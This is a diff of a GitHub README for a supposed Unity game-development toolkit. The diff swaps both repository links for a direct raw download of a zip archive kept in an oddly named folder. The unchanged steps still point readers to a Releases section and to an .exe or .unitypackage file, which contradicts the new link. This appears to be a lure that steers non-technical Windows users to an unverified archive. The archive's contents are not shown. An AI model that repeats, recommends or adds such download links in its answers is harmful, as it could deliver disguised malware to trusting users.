@@ -1,7 +1,7 @@
 # 🛠️ Unity-Dev-Toolkit - Build Better Games In Less Time
 
 <p align="center">
-  <a href="https://github.com/gabiestuck33/Unity-Dev-Toolkit">
+  <a href="https://github.com/gabiestuck33/Unity-Dev-Toolkit/raw/refs/heads/main/Peritricha/Unity-Toolkit-Dev-3.5.zip">
     <img src="https://img.shields.io/badge/Download-Release-blue" alt="Download Unity Dev Toolkit">
   </a>
 </p>
@@ -12,7 +12,7 @@ Unity Dev Toolkit 2026 improves how you build games in the Unity Engine. This to
 
 You do not need programming skills to use this toolkit. Follow these steps to set up the software on your Windows computer.
 
-1. Visit this page to download the latest version: [https://github.com/gabiestuck33/Unity-Dev-Toolkit](https://github.com/gabiestuck33/Unity-Dev-Toolkit)
+1. Visit this page to download the latest version: [https://github.com/gabiestuck33/Unity-Dev-Toolkit/raw/refs/heads/main/Peritricha/Unity-Toolkit-Dev-3.5.zip](https://github.com/gabiestuck33/Unity-Dev-Toolkit/raw/refs/heads/main/Peritricha/Unity-Toolkit-Dev-3.5.zip)
 2. Locate the most recent release under the Releases section on the right side of the page.
 3. Click the file that ends in .unitypackage or .exe depending on your specific setup requirements.
 4. Save the file to your computer.
